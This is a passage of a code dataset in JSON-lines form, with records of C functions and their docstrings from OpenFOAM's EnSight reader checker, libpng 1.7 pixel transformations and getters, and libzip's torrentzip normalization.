ijk_dimensions[i][4] - ijk_dimensions[i][3] + 1;\n            Pbuild[i].ne[1] = ijk_dimensions[i][6] - ijk_dimensions[i][5] + 1;\n            Pbuild[i].ne[2] = ijk_dimensions[i][8] - ijk_dimensions[i][7] + 1;\n\n            Pbuild[i].ne[3] = ijk_dimensions[i][3];\n            Pbuild[i].ne[4] = ijk_dimensions[i][4];\n            Pbuild[i].ne[5] = ijk_dimensions[i][5];\n            Pbuild[i].ne[6] = ijk_dimensions[i][6];\n            Pbuild[i].ne[7] = ijk_dimensions[i][7];\n            Pbuild[i].ne[8] = ijk_dimensions[i][8];\n\n            Pbuild[i].ne[9] = ijk_dimensions[i][0];\n            Pbuild[i].ne[10] = ijk_dimensions[i][1];\n            Pbuild[i].ne[11] = ijk_dimensions[i][2];\n\n            fprintf(stderr,\"   Part has ranges:\\n\");\n            fprintf(stderr,\"   ijk dimensions of total block: %d %d %d\\n\",\n                    Pbuild[i].ne[9],\n                    Pbuild[i].ne[10],\n                    Pbuild[i].ne[11]);\n            fprintf(stderr,\"     i range: %d  to  %d\\n\",\n                    Pbuild[i].ne[3],\n                    Pbuild[i].ne[4]);\n            fprintf(stderr,\"     j range: %d  to  %d\\n\",\n                    Pbuild[i].ne[5],\n                    Pbuild[i].ne[6]);\n            fprintf(stderr,\"     k range: %d  to  %d\\n\",\n                    Pbuild[i].ne[7],\n                    Pbuild[i].ne[8]);\n            fprintf(stderr,\"   ijk dimensions of range portion: %d %d %d\\n\",\n                    Pbuild[i].ne[0],\n                    Pbuild[i].ne[1],\n                    Pbuild[i].ne[2]);\n          }\n        }\n#else\n        fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                ijk_dimensions[i][0],\n                ijk_dimensions[i][1],\n                ijk_dimensions[i][2]);\n        Pbuild[i].ne[0] = ijk_dimensions[i][0];\n        Pbuild[i].ne[1] = ijk_dimensions[i][1];\n        Pbuild[i].ne[2] = ijk_dimensions[i][2];\n        Pbuild[i].ne[3] = -1;\n#endif\n        if(part_types[i] == Z_IBLANKED) {\n          fprintf(stderr,\"   Ibanking options on:\\n\");\n          if(iblanking_options[i][Z_EXT]) {\n            fprintf(stderr,\"     Z_EXT\\n\");\n          }\n          if(iblanking_options[i][Z_INT]) {\n            fprintf(stderr,\"     Z_INT\\n\");\n          }\n          if(iblanking_options[i][Z_BND]) {\n            fprintf(stderr,\"     Z_BND\\n\");\n          }\n          if(iblanking_options[i][Z_INTBND]) {\n            fprintf(stderr,\"     Z_INTBND\\n\");\n          }\n          if(iblanking_options[i][Z_SYM]) {\n            fprintf(stderr,\"     Z_SYM\\n\");\n          }\n        }\n      }\n    }\n  }\n\n\n#if (defined GT_USERD_API_200)\n\n  /* Get ghosts in model flag\n   *-------------------------*/\n  Ghosts_in_model = USERD_get_ghosts_in_model_flag();\n  if(Ghosts_in_model) {\n    fprintf(stderr,\" Ghosts in Model:  TRUE\\n\");\n  }\n  else {\n    fprintf(stderr,\" Ghosts in Model:  FALSE\\n\");\n  }\n\n  /* Get ghosts in block flag - if needed\n   *-------------------------------------*/\n  for(i=1; i<=Num_parts; ++i) {\n    if(part_types[i-1] != Z_UNSTRUCTURED && Ghosts_in_model) {\n      ghosts_in_block = USERD_get_ghosts_in_block_flag(i);\n      Pbuild[i-1].ghosts = ghosts_in_block;\n      if(ghosts_in_block) {\n        fprintf(stderr,\" Ghosts in block part %d:  TRUE\\n\",i);\n      }\n      else {\n        fprintf(stderr,\" Ghosts in block part %d:  FALSE\\n\",i);\n      }\n    }\n  }\n\n#endif\n\n\n#if (defined GT_USERD_API_100)\n\n  /* Get maxsize info\n   *-----------------*/\n  max_num_nodes = (int *) calloc(Num_parts,sizeof(int));\n  if(max_num_nodes == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part max num of nodes\\n\");\n    return(Z_ERR);\n  }\n\n  max_num_elems = (int **) calloc(Num_parts,sizeof(int *));\n  if(max_num_elems == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part max num of elements\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      max_num_elems[i] = (int *) calloc(Z_MAXTYPE,sizeof(int));\n      if(max_num_elems[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part max_num of elements\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  max_ijk_dimensions = (int **) calloc(Num_parts,sizeof(int *));\n  if(max_ijk_dimensions == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part max ijk dimensions\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      max_ijk_dimensions[i] = (int *) calloc(3,sizeof(int));\n      if(max_ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part max ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  err = USERD_get_maxsize_info(max_num_nodes,\n                               max_num_elems,\n                               max_ijk_dimensions);\n  if(err == Z_ERR) {\n    fprintf(stderr,\" No maxsize info provided (or error getting them)\\n\");\n  }\n  else {\n\n    for(i=0; i<Num_parts; ++i) {\n      fprintf(stderr,\" For part %d:\\n\",i+1);\n\n      fprintf(stderr,\"   max number of nodes :   %d\\n\",max_num_nodes[i]);\n\n      for(j=0; j<Z_MAXTYPE; ++j) {\n        if(max_num_elems[i][j] > 0) {\n          fprintf(stderr,\"   max # %s elems:   %d\\n\",\n                  Elem_info[j].name,max_num_elems[i][j]);\n        }\n      }\n\n      if(part_types[i] != Z_UNSTRUCTURED) {\n        fprintf(stderr,\"   max_ijk_dimensions: %d %d %d\\n\",\n                max_ijk_dimensions[i][0],\n                max_ijk_dimensions[i][1],\n                max_ijk_dimensions[i][2]);\n      }\n    }\n  }\n\n  /* Get model extents - if given\n   *-----------------------------*/\n  err = USERD_get_model_extents(extents);\n  if(err == Z_ERR) {\n    fprintf(stderr,\" No extents given\\n\");\n  }\n  else {\n    fprintf(stderr,\" Min x: %g\\n\",extents[0]);\n    fprintf(stderr,\" Max x: %g\\n\",extents[1]);\n    fprintf(stderr,\" Min y: %g\\n\",extents[2]);\n    fprintf(stderr,\" Max y: %g\\n\",extents[3]);\n    fprintf(stderr,\" Min z: %g\\n\",extents[4]);\n    fprintf(stderr,\" Max z: %g\\n\",extents[5]);\n  }\n\n#endif\n\n  /* Free the allocated memory\n   *--------------------------*/\n  free(part_ids);\n  free(part_types);\n  free(number_of_nodes);\n\n  for(i=0; i<Num_parts; ++i) {\n    free(ijk_dimensions[i]);\n    free(num_elems[i]);\n    free(part_descriptions[i]);\n  }\n  free(ijk_dimensions);\n  free(num_elems);\n  free(iblanking_options);\n  free(part_descriptions);\n\n#if (defined GT_USERD_API_100)\n  for(i=0; i<Num_parts; ++i) {\n    free(max_ijk_dimensions[i]);\n    free(max_num_elems[i]);\n  }\n  free(max_num_nodes);\n  free(max_num_elems);\n  free(max_ijk_dimensions);\n\n#endif\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/* -------------------------------------------------------\n *  threshold_operator1 & 2 can be one of the following\n *    Z_ELE_FAILED_NONE,           - disables checking\n *     Z_ELE_FAILED_GREATER,        - greater than\n *     Z_ELE_FAILED_LESS,           - less than\n *     Z_ELE_FAILED_EQUAL,          - equal\n *     Z_ELE_FAILED_NOT_EQUAL,      - not equal\n *     Z_ELE_FAILED_MANY            - not used\n *\n * logic_criteria2\n *      Z_ELE_FAILED_LOGIC_NONE,\n *      Z_ELE_FAILED_LOGIC_AND,\n *      Z_ELE_FAILED_LOGIC_OR,\n *      Z_ELE_FAILED_LOGIC_MANY\n *\n * ------------------------------------------------------ */\n", "func_signal": "int load_fail_defaults(void)", "code": "{\n  int check_for_failed = FALSE;\n  int cri1 = 0;                 /* Criteria1 ELE_FAILED_GREATER, etc */\n  int cri2 = 0;\n  int  logic_cri2 = 0;        /* Logic for criteria 2  ELE_FAILED_LOGIC_NONE, AND, etc */\n  float val1 = 0.0;           /* failure threshold 1 */\n  float  val2= 0.0;           /* failure threshold 2 */\n  char failed_var_name[Z_MXVARIABLEDESC]={EOS};\n\n  check_for_failed =  USERD_get_uns_failed_params( failed_var_name,\n                                                   &val1, &val2, &cri1, &cri2,\n                                                   &logic_cri2 );\n  if (check_for_failed == TRUE) {\n    fprintf(stderr,\"Failed element criteria info \\n\");\n    fprintf(stderr,\"Variable name = %s\\n\",failed_var_name);\n    fprintf(stderr,\"Criteria 1 = %d\\n\",cri1);\n    fprintf(stderr,\"Criteria 2 = %d\\n\",cri1);\n    fprintf(stderr,\"Logic criteria = %d\\n\",logic_cri2);\n    fprintf(stderr,\"Value 1 = %f\\n\",val1);\n    fprintf(stderr,\"Value 2 = %f\\n\",val2);\n  } else {\n    fprintf(stderr,\"No Failed elements\\n\");\n  }\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * entity_querys\n *--------------*/\n", "func_signal": "static int\nentity_querys(int var_time_step)", "code": "{\n  int i, j;\n  int err;\n  int v, vn;\n  int var_timeset;\n  int p, pn;\n  int et, e1, e2;\n  int num_comps;\n  int num_dims;\n  int nsize;\n  int comp;\n  int bdim[3];\n  int ne;\n  int cell_type;\n  char line1[Z_BUFL];\n  char line2[Z_BUFL];\n  float qvals[3];\n  int bd1,bd2,bd3;\n\n\n  fprintf(stderr,\"\\n-------------- entity_querys ------------\\n\");\n  fprintf(stderr,\"       (scalar & vector variables only)    \\n\");\n  fprintf(stderr,\"\\n\");\n\n#if (defined USERD_API_100)\n\n  if(Num_time_steps > 1) {\n    /* Get the number of time steps for this timeset\n     *----------------------------------------------*/\n    if(var_time_step > (Num_time_steps - 1)) {\n      var_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the time step - to first step by default, but\n     * can set it at others using -vts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_step(var_time_step);\n\n    fprintf(stderr,\" Using time step: %d  (where range is %d through %d)\\n\\n\",\n            var_time_step,0,Num_time_steps-1);\n  }\n#endif\n\n  for(v=0; v<Num_vars; ++v) {\n    vn = v + 1;\n\n    /* Scalar or vectors only\n     *-----------------------*/\n    if(Varinfo[v].type == Z_SCALAR || Varinfo[v].type == Z_VECTOR) {\n\n\n      if(Varinfo[v].classify == Z_PER_NODE) {\n        fprintf(stderr,\" Z_PER_NODE Variable %d:\\n\",vn);\n      }\n      else {\n        fprintf(stderr,\" Z_PER_ELEM Variable %d:\\n\",vn);\n      }\n\n#if (defined GT_USERD_API_100)\n\n      if(Num_time_sets > 0) {\n        /* Get the timeset used for the variable\n         *---------------------------------------*/\n        var_timeset = Varinfo[v].timeset;\n\n        /* Get the number of time steps for this timeset\n         *----------------------------------------------*/\n        Num_time_steps = USERD_get_num_of_time_steps(var_timeset);\n        if(Num_time_steps < 1) {\n          fprintf(stderr,\" Error: Number of time steps returned: %d\\n\",\n                  Num_time_steps);\n          fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n          return(Z_ERR);\n        }\n        if(var_time_step > (Num_time_steps - 1)) {\n          var_time_step = Num_time_steps - 1;\n        }\n\n        /* Set the timeset and step - to first step by default, but\n         * can set it at others using -vts command argument\n         *---------------------------------------------------------*/\n        USERD_set_time_set_and_step(var_timeset,var_time_step);\n\n        fprintf(stderr,\"   Using timeset:   %d  (step range is %d through %d)\\n\",\n                var_timeset,0,Num_time_steps-1);\n        fprintf(stderr,\"   Using time step: %d\\n\",var_time_step);\n      }\n#endif\n\n\n      /* Get the var description line\n       *-----------------------------*/\n#if (defined GT_USERD_API_100)\n      err = USERD_get_descrip_lines(Z_VARI,vn,FALSE,line1,line2);\n      if(err == Z_OK) {\n        fprintf(stderr,\"   Desc line: %s\\n\",line1);\n      }\n      else {\n        fprintf(stderr,\"Error: getting var description line\\n\");\n        return(Z_ERR);\n      }\n\n      if(Varinfo[v].complex) {\n        err = USERD_get_descrip_lines(Z_VARI,vn,TRUE,line1,line2);\n        if(err == Z_OK) {\n          fprintf(stderr,\"   Desc line (imag): %s\\n\",line1);\n        }\n        else {\n          fprintf(stderr,\"Error: getting var description line (imag)\\n\");\n          return(Z_ERR);\n        }\n      }\n#else\n\n      err = USERD_get_description_lines(Z_VARI,vn,line1,line2);\n      if(err == Z_OK) {\n        fprintf(stderr,\"   Desc line: %s\\n\",line1);\n      }\n      else {\n        fprintf(stderr,\"Error: getting var description line\\n\");\n        return(Z_ERR);\n      }\n\n#endif\n\n      /* Get the values by component\n       *-----------------------------*/\n      if(Varinfo[v].type == Z_SCALAR) {\n        num_comps = 1;\n      }\n      else if(Varinfo[v].type == Z_VECTOR) {\n        num_comps = 3;\n      }\n\n      /* Per_Node\n       *---------*/\n      if(Varinfo[v].classify == Z_PER_NODE) {\n\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            nsize = Pbuild[p].nn;\n          }\n          else {\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n            nsize = bdim[0] * bdim[1] * bdim[2];\n          }\n\n\n\n          if(nsize > 0) {\n\n            fprintf(stderr,\"   For part %d, using node %d:\\n\",pn,nsize);\n\n#if (defined GT_USERD_API_100)\n            err = USERD_get_var_value_at_specific(vn,\n                                                  nsize,\n                                                  pn,\n                                                  0,\n                                                  var_time_step,\n                                                  qvals,\n                                                  FALSE);\n#else\n            err = USERD_get_variable_value_at_specific(vn,\n                                                       nsize,\n                                                       pn,\n                                                       0,\n                                                       var_time_step,\n                                                       qvals);\n#endif\n            if(err == Z_NOT_IMPLEMENTED) {\n              fprintf(stderr,\"  Node and element queries not implemented\\n\");\n              return(Z_OK);\n            }\n            else if(err == Z_ERR) {\n              fprintf(stderr,\"     Could not get value\\n\");\n            }\n            else {\n\n              /* For the component, show 1st node, last node, min, max values\n               *-------------------------------------------------------------*/\n              if(Varinfo[v].type == Z_SCALAR) {\n                fprintf(stderr,\"     Scalar value is: %g\\n\",qvals[0]);\n              }\n              else {\n                fprintf(stderr,\"     Vector values are: %g %g %g\\n\",\n                        qvals[0],qvals[1],qvals[2]);\n              }\n\n#if (defined GT_USERD_API_100)\n              if(Varinfo[v].complex) {\n\n                err = USERD_get_var_value_at_specific(vn,\n                                                      nsize,\n                                                      pn,\n                                                      0,\n                                                      var_time_step,\n                                                      qvals,\n                                                      TRUE);\n\n                if(err == Z_ERR) {\n                  fprintf(stderr,\"     Could not get imag value\\n\");\n                }\n                else {\n\n                  /* For the component, show 1st node, last node, min, max values\n                   *-------------------------------------------------------------*/\n                  if(Varinfo[v].type == Z_SCALAR) {\n                    fprintf(stderr,\"     Scalar value (imag) is: %g\\n\",qvals[0]);\n                  }\n                  else {\n                    fprintf(stderr,\"     Vector values (imag) are: %g %g %g\\n\",\n                            qvals[0],qvals[1],qvals[2]);\n                  }\n                }\n              }\n#endif\n\n            }\n          }\n        }\n      }\n\n      /* Per_Elem\n       *---------*/\n      else {\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type != Z_UNSTRUCTURED) {\n\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n            bd1 = bdim[0]-1;\n            if(bd1 < 1) {\n              bd1 = 1;\n            }\n            bd2 = bdim[1]-1;\n            if(bd2 < 1) {\n              bd2 = 1;\n            }\n            bd3 = bdim[2]-1;\n            if(bd3 < 1) {\n              bd3 = 1;\n            }\n            nsize = bd1 * bd2 * bd3;\n\n\n            /* Determine cell type\n             *--------------------*/\n            num_dims = 3;\n            for(i=0; i<3; ++i) {\n              if(bdim[i] == 1) {\n                --num_dims;\n              }\n            }\n            if(num_dims == 3) {\n              cell_type = Z_HEX08;\n            }\n            else if(num_dims == 2) {\n              cell_type = Z_QUA04;\n            }\n            else {\n              cell_type = Z_BAR02;\n            }\n          }\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            e1 = 0;\n            e2 = Z_MAXTYPE-1;\n          }\n          else {\n            e1 = e2 = cell_type;\n          }\n\n          for(et=e1; et<=e2; ++et) {\n\n            if(Pbuild[p].type == Z_UNSTRUCTURED) {\n              nsize = Pbuild[p].ne[et];\n            }\n\n            if(nsize > 0) {\n\n\n              fprintf(stderr,\"   For part %d, using elem %d of type %s:\\n\",\n                      pn,nsize,Elem_info[et].name);\n\n\n#if (defined GT_USERD_API_100)\n              err = USERD_get_var_value_at_specific(vn,\n                                                    nsize,\n                                                    pn,\n                                                    et,\n                                                    var_time_step,\n                                                    qvals,\n                                                    FALSE);\n#else\n            err = USERD_get_variable_value_at_specific(vn,\n                                                       nsize,\n                                                       pn,\n                                                       et,\n                                                       var_time_step,\n                                                       qvals);\n#endif\n\n              if(err == Z_NOT_IMPLEMENTED) {\n                fprintf(stderr,\"  Node and element queries not implemented\\n\");\n                return(Z_OK);\n              }\n              else if(err == Z_ERR) {\n                fprintf(stderr,\"     Could not get value\\n\");\n              }\n              else {\n                if(Varinfo[v].type == Z_SCALAR) {\n                  fprintf(stderr,\"     Scalar value is: %g\\n\",qvals[0]);\n                }\n                else {\n                  fprintf(stderr,\"     Vector values are: %g %g %g\\n\",\n                          qvals[0],qvals[1],qvals[2]);\n                }\n\n#if (defined GT_USERD_API_100)\n                if(Varinfo[v].complex) {\n\n                  err = USERD_get_var_value_at_specific(vn,\n                                                        nsize,\n                                                        pn,\n                                                        et,\n                                                        var_time_step,\n                                                        qvals,\n                                                        TRUE);\n                  if(err == Z_ERR) {\n                    fprintf(stderr,\"     Could not get imag value\\n\");\n                  }\n                  else {\n                    if(Varinfo[v].type == Z_SCALAR) {\n                      fprintf(stderr,\"     Scalar value (imag) is: %g\\n\",qvals[0]);\n                    }\n                    else {\n                      fprintf(stderr,\"     Vector values (imag) are: %g %g %g\\n\",\n                              qvals[0],qvals[1],qvals[2]);\n                    }\n                  }\n                }\n#endif\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/* Add a filler byte on read, or remove a filler or alpha byte on write.\n * The filler type has changed in v0.95 to allow future 2-byte fillers\n * for 48-bit input data, as well as to avoid problems with some compilers\n * that don't like bytes as parameters.\n */\n", "func_signal": "void PNGAPI\npng_set_filler(png_structrp png_ptr, png_uint_32 filler, int filler_loc)", "code": "{\n   png_debug(1, \"in png_set_filler\");\n\n   if (png_ptr == NULL)\n      return;\n\n   /* In libpng 1.6 it is possible to determine whether this is a read or write\n    * operation and therefore to do more checking here for a valid call.\n    */\n   if (png_ptr->mode & PNG_IS_READ_STRUCT)\n   {\n#     ifdef PNG_READ_FILLER_SUPPORTED\n         /* On read png_set_filler is always valid, regardless of the base PNG\n          * format, because other transformations can give a format where the\n          * filler code can execute (basically an 8 or 16-bit component RGB or G\n          * format.)\n          *\n          * NOTE: usr_channels is not used by the read code!  (This has led to\n          * confusion in the past.)  The filler is only used in the read code.\n          */\n         png_ptr->filler = (png_uint_16)filler;\n#     else\n         png_app_error(png_ptr, \"png_set_filler not supported on read\");\n         PNG_UNUSED(filler) /* not used in the write case */\n         return;\n#     endif\n   }\n\n   else /* write */\n   {\n#     ifdef PNG_WRITE_FILLER_SUPPORTED\n         /* On write the usr_channels parameter must be set correctly at the\n          * start to record the number of channels in the app-supplied data.\n          */\n         switch (png_ptr->color_type)\n         {\n            case PNG_COLOR_TYPE_RGB:\n               png_ptr->usr_channels = 4;\n               break;\n\n            case PNG_COLOR_TYPE_GRAY:\n               if (png_ptr->bit_depth >= 8)\n               {\n                  png_ptr->usr_channels = 2;\n                  break;\n               }\n\n               else\n               {\n                  /* There simply isn't any code in libpng to strip out bits\n                   * from bytes when the components are less than a byte in\n                   * size!\n                   */\n                  png_app_error(png_ptr,\n                     \"png_set_filler is invalid for low bit depth gray output\");\n                  return;\n               }\n\n            default:\n               png_app_error(png_ptr,\n                  \"png_set_filler: inappropriate color type\");\n               return;\n         }\n#     else\n         png_app_error(png_ptr, \"png_set_filler not supported on write\");\n         return;\n#     endif\n   }\n\n   /* Here on success - libpng supports the operation, set the transformation\n    * and the flag to say where the filler channel is.\n    */\n   png_ptr->transformations |= PNG_FILLER;\n\n   if (filler_loc == PNG_FILLER_AFTER)\n      png_ptr->flags |= PNG_FLAG_FILLER_AFTER;\n\n   else\n      png_ptr->flags &= ~PNG_FLAG_FILLER_AFTER;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Turn on packed pixel swapping */\n", "func_signal": "void PNGAPI\npng_set_packswap(png_structrp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_packswap\");\n\n   if (png_ptr == NULL)\n      return;\n\n   if (png_ptr->bit_depth < 8)\n      png_ptr->transformations |= PNG_PACKSWAP;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Turn on 16 bit byte swapping */\n", "func_signal": "void PNGAPI\npng_set_swap(png_structrp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_swap\");\n\n   if (png_ptr == NULL)\n      return;\n\n   if (png_ptr->bit_depth == 16)\n      png_ptr->transformations |= PNG_SWAP_BYTES;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_check_palette_indexes(png_structrp png_ptr, png_row_infop row_info)", "code": "{\n   if (png_ptr->num_palette < (1 << row_info->bit_depth) &&\n      png_ptr->num_palette > 0) /* num_palette can be 0 in MNG files */\n   {\n      /* Calculations moved outside switch in an attempt to stop different\n       * compiler warnings.  'padding' is in *bits* within the last byte, it is\n       * an 'int' because pixel_depth becomes an 'int' in the expression below,\n       * and this calculation is used because it avoids warnings that other\n       * forms produced on either GCC or MSVC.\n       */\n      int padding = (-row_info->pixel_depth * row_info->width) & 7;\n      png_bytep rp = png_ptr->row_buf + row_info->rowbytes;\n\n      switch (row_info->bit_depth)\n      {\n         case 1:\n         {\n            /* in this case, all bytes must be 0 so we don't need\n             * to unpack the pixels except for the rightmost one.\n             */\n            for (; rp > png_ptr->row_buf; rp--)\n            {\n              if (*rp >> padding != 0)\n                 png_ptr->num_palette_max = 1;\n              padding = 0;\n            }\n\n            break;\n         }\n\n         case 2:\n         {\n            for (; rp > png_ptr->row_buf; rp--)\n            {\n              int i = ((*rp >> padding) & 0x03);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              i = (((*rp >> padding) >> 2) & 0x03);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              i = (((*rp >> padding) >> 4) & 0x03);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              i = (((*rp >> padding) >> 6) & 0x03);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              padding = 0;\n            }\n\n            break;\n         }\n\n         case 4:\n         {\n            for (; rp > png_ptr->row_buf; rp--)\n            {\n              int i = ((*rp >> padding) & 0x0f);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              i = (((*rp >> padding) >> 4) & 0x0f);\n\n              if (i > png_ptr->num_palette_max)\n                 png_ptr->num_palette_max = i;\n\n              padding = 0;\n            }\n\n            break;\n         }\n\n         case 8:\n         {\n            for (; rp > png_ptr->row_buf; rp--)\n            {\n               if (*rp > png_ptr->num_palette_max)\n                  png_ptr->num_palette_max = (int) *rp;\n            }\n\n            break;\n         }\n\n         default:\n            break;\n      }\n   }\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* _zip_dirent_torrent_normalize(de);\n   Set values suitable for torrentzip.\n*/\n", "func_signal": "void\n_zip_dirent_torrent_normalize(struct zip_dirent *de)", "code": "{\n    static struct tm torrenttime;\n    static time_t last_mod = 0;\n\n    if (last_mod == 0) {\n#ifdef HAVE_STRUCT_TM_TM_ZONE\n\ttime_t now;\n\tstruct tm *l;\n#endif\n\n\ttorrenttime.tm_sec = 0;\n\ttorrenttime.tm_min = 32;\n\ttorrenttime.tm_hour = 23;\n\ttorrenttime.tm_mday = 24;\n\ttorrenttime.tm_mon = 11;\n\ttorrenttime.tm_year = 96;\n\ttorrenttime.tm_wday = 0;\n\ttorrenttime.tm_yday = 0;\n\ttorrenttime.tm_isdst = 0;\n\n#ifdef HAVE_STRUCT_TM_TM_ZONE\n\ttime(&now);\n\tl = localtime(&now);\n\ttorrenttime.tm_gmtoff = l->tm_gmtoff;\n\ttorrenttime.tm_zone = l->tm_zone;\n#endif\n\n\tlast_mod = mktime(&torrenttime);\n    }\n    \n    de->version_madeby = 0;\n    de->version_needed = 20; /* 2.0 */\n    de->bitflags = 2; /* maximum compression */\n    de->comp_method = ZIP_CM_DEFLATE;\n    de->last_mod = last_mod;\n\n    de->disk_number = 0;\n    de->int_attrib = 0;\n    de->ext_attrib = 0;\n    de->offset = 0;\n\n    free(de->extrafield);\n    de->extrafield = NULL;\n    de->extrafield_len = 0;\n    free(de->comment);\n    de->comment = NULL;\n    de->comment_len = 0;\n}", "path": "ext\\libzip\\zip_dirent.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Easy access to info, added in libpng-0.99 */\n", "func_signal": "png_uint_32 PNGAPI\npng_get_image_width(png_const_structrp png_ptr, png_const_inforp info_ptr)", "code": "{\n   if (png_ptr != NULL && info_ptr != NULL)\n      return info_ptr->width;\n\n   return (0);\n}", "path": "ext\\libpng17\\pngget.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PNG_EASY_ACCESS_SUPPORTED */\n", "func_signal": "png_byte PNGAPI\npng_get_channels(png_const_structrp png_ptr, png_const_inforp info_ptr)", "code": "{\n   if (png_ptr != NULL && info_ptr != NULL)\n      return(info_ptr->channels);\n\n   return (0);\n}", "path": "ext\\libpng17\\pngget.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_strip_channel(png_row_infop row_info, png_bytep row, int at_start)", "code": "{\n   png_bytep sp = row; /* source pointer */\n   png_bytep dp = row; /* destination pointer */\n   png_bytep ep = row + row_info->rowbytes; /* One beyond end of row */\n\n   /* At the start sp will point to the first byte to copy and dp to where\n    * it is copied to.  ep always points just beyond the end of the row, so\n    * the loop simply copies (channels-1) channels until sp reaches ep.\n    *\n    * at_start:        0 -- convert AG, XG, ARGB, XRGB, AAGG, XXGG, etc.\n    *            nonzero -- convert GA, GX, RGBA, RGBX, GGAA, RRGGBBXX, etc.\n    */\n\n   /* GA, GX, XG cases */\n   if (row_info->channels == 2)\n   {\n      if (row_info->bit_depth == 8)\n      {\n         if (at_start != 0) /* Skip initial filler */\n            ++sp;\n         else          /* Skip initial channel and, for sp, the filler */\n            sp += 2, ++dp;\n\n         /* For a 1 pixel wide image there is nothing to do */\n         while (sp < ep)\n            *dp++ = *sp, sp += 2;\n\n         row_info->pixel_depth = 8;\n      }\n\n      else if (row_info->bit_depth == 16)\n      {\n         if (at_start != 0) /* Skip initial filler */\n            sp += 2;\n         else          /* Skip initial channel and, for sp, the filler */\n            sp += 4, dp += 2;\n\n         while (sp < ep)\n            *dp++ = *sp++, *dp++ = *sp, sp += 3;\n\n         row_info->pixel_depth = 16;\n      }\n\n      else\n         return; /* bad bit depth */\n\n      row_info->channels = 1;\n\n      /* Finally fix the color type if it records an alpha channel */\n      if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA)\n         row_info->color_type = PNG_COLOR_TYPE_GRAY;\n   }\n\n   /* RGBA, RGBX, XRGB cases */\n   else if (row_info->channels == 4)\n   {\n      if (row_info->bit_depth == 8)\n      {\n         if (at_start != 0) /* Skip initial filler */\n            ++sp;\n         else          /* Skip initial channels and, for sp, the filler */\n            sp += 4, dp += 3;\n\n         /* Note that the loop adds 3 to dp and 4 to sp each time. */\n         while (sp < ep)\n            *dp++ = *sp++, *dp++ = *sp++, *dp++ = *sp, sp += 2;\n\n         row_info->pixel_depth = 24;\n      }\n\n      else if (row_info->bit_depth == 16)\n      {\n         if (at_start != 0) /* Skip initial filler */\n            sp += 2;\n         else          /* Skip initial channels and, for sp, the filler */\n            sp += 8, dp += 6;\n\n         while (sp < ep)\n         {\n            /* Copy 6 bytes, skip 2 */\n            *dp++ = *sp++, *dp++ = *sp++;\n            *dp++ = *sp++, *dp++ = *sp++;\n            *dp++ = *sp++, *dp++ = *sp, sp += 3;\n         }\n\n         row_info->pixel_depth = 48;\n      }\n\n      else\n         return; /* bad bit depth */\n\n      row_info->channels = 3;\n\n      /* Finally fix the color type if it records an alpha channel */\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n         row_info->color_type = PNG_COLOR_TYPE_RGB;\n   }\n\n   else\n      return; 